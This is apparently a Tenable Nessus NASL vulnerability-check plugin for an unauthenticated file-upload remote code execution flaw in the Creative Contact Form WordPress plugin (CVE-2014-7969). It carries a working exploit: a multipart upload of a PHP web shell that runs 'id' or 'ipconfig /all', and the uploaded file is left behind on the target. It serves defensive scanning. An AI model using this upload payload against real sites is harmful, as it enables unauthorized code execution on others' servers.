#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(79421);
  script_version("1.13");
  script_set_attribute(attribute:"plugin_modification_date", value:"2024/06/04");

  script_cve_id("CVE-2014-7969");
  script_bugtraq_id(70723);
  script_xref(name:"EDB-ID", value:"34922");
  script_xref(name:"EDB-ID", value:"35057");

  script_name(english:"Creative Contact Form Plugin for WordPress File Upload RCE");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that allows arbitrary code
execution.");
  script_set_attribute(attribute:"description", value:
"The Creative Contact Form Plugin for WordPress (previously known as
Sexy Contact Form) installed on the remote host is affected by a
remote code execution vulnerability due to the failure to properly
sanitize user-supplied files that are uploaded to the script
'/includes/fileupload/UploadHandler.php'. By uploading a malicious
file, a remote, unauthenticated attacker can exploit this issue to
execute arbitrary code under the privileges of the web server user.");
  script_set_attribute(attribute:"see_also", value:"https://wordpress.org/plugins/sexy-contact-form/#changelog");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 1.0.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Wordpress Creative Contact Form Upload Vulnerability');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/10/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/10/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/11/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"enable_cgi_scanning", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2024 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("os_fingerprint.nasl", "wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "Creative Contact Form";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('var sexycontactform_');
  checks["/wp-content/plugins/sexy-contact-form/includes/js/sexycontactform.js"] = regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig%20/all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig%20/all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig%20/all'] = "Subnet Mask";

token = (SCRIPT_NAME - ".nasl") + "-" + unixtime();
ext = ".php";
vuln = FALSE;
r = 0;

boundary = '-------------------------------';

foreach cmd (cmds)
{
  token += r;
  if (cmd == "id")
    attack = '<?php system(id);echo("path="); system(pwd);?>';
  else
  {
    attack = '<?php echo(' + "'<pre>');system('ipconfig /all');system('dir " +
    token + ext + "');?>";
  }

  postdata =
    boundary + '--\r\n' +
    'Content-Disposition: form-data; name="files[]"; filename="' + token + ext +
    '"\r\n' +
    'Content-Type: text/plain\r\n' +
    '\r\n' + attack + '\r\n\r\n' +
    boundary + '----\r\n';

  # Attempt exploit
  res = http_send_recv3(
    method       : "POST",
    item         : dir + "/wp-content/plugins/sexy-contact-form/includes" +                        "/fileupload/index.php",
    port         : port,
    data         : postdata,
    add_headers  : make_array("Content-Type", "multipart/form-data; boundary=" +
                   boundary),
    exit_on_fail : TRUE
  );

  attack_req = http_last_sent_request();

  # Try accessing the file we uploaded
  file_path = "/wp-content/plugins/sexy-contact-form/includes/" +
    "fileupload/files/" + token + ext;

  res2 = http_send_recv3(
    method       : "GET",
    item         : dir + file_path,
    port         : port,
    exit_on_fail : TRUE
  );
  output = res2[2];

  if (egrep(pattern:cmd_pats[cmd], string:output))
  {
    vuln = TRUE;
    if (cmd == "id")
    {
      line_limit = 2;
      item = eregmatch(pattern:"path=(.*)", string:output);

      if (!empty_or_null(item))
      {
        path = chomp(item[1]) + '/' + token + ext;
        pos = stridx(output, "path=");
        output = substr(output, 0, pos-1);
      }
      else path = 'unknown';
    }
    else
    {
      cmd = 'ipconfig /all'; #Format for report output
      line_limit = 10;
      output = strstr(output, "Windows IP");
      item = eregmatch(pattern:"Directory of (.*)", string:output);

      if (!empty_or_null(item))
      {
        path = chomp(item[1]) + '\\' + token + ext;
        pos = stridx(output, "Volume in drive");
        output = substr(output, 0, pos - 1);
      }
      else path = 'unknown';
    }
    if (empty_or_null(output)) output = res2[2]; # Just in case
    break;
  }
  # Increment file name before next request attempt
  else r++;
}
if (!vuln) audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  cmd         : cmd,
  line_limit  : line_limit,
  request     : make_list(attack_req, install_url + file_path),
  output      : chomp(output),
  rep_extra   : '\n' + 'Note: This file has not been removed by Nessus and will need to be' +
                '\n' + 'manually deleted (' + path + ').'
);
